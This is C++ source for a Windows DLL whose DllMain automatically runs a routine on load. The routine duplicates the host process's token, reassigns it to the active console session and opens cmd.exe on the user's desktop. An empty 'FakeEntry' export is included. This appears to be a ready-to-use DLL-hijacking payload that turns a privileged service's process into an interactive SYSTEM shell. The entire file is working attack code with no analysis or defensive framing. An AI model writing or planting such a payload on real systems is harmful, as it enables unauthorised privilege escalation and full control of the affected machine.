// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

extern "C"
{
    __declspec(dllexport) VOID FakeEntry()
    {
        return;
    }


    __declspec(dllexport) BOOL ShellSpawn()
    {
        STARTUPINFO si = { 0 };
        si.cb = sizeof(si);
        si.wShowWindow = SW_SHOW;
        si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");
        PROCESS_INFORMATION pi = { 0 };
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        DWORD sessionId = ::WTSGetActiveConsoleSessionId();

        if (sessionId == 0xFFFFFFFF)
        {
            return FALSE;
        }

        BOOL status = ::OpenProcessToken(
            ::GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
            &hToken);

        if (!status) return FALSE;

        status = ::DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            nullptr,
            SecurityAnonymous,
            TokenPrimary,
            &hDupToken);

        if (!status) {
            ::CloseHandle(hToken);

            return FALSE;
        }

        // Requires SeTcbPrivilege
        status = ::SetTokenInformation(
            hDupToken,
            TokenSessionId,
            &sessionId,
            sizeof(sessionId));

        if (!status) {
            ::CloseHandle(hDupToken);
            ::CloseHandle(hToken);

            return FALSE;
        }

        status = ::CreateProcessAsUser(
            hDupToken,
            const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
            const_cast<wchar_t*>(L""),
            nullptr,
            nullptr,
            FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &si,
            &pi);

        ::CloseHandle(hDupToken);
        ::CloseHandle(hToken);

        if (status) {
            ::CloseHandle(pi.hThread);
            ::CloseHandle(pi.hProcess);
        }

        return status;
    }
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        ShellSpawn();
        break;
    }
    return TRUE;
}
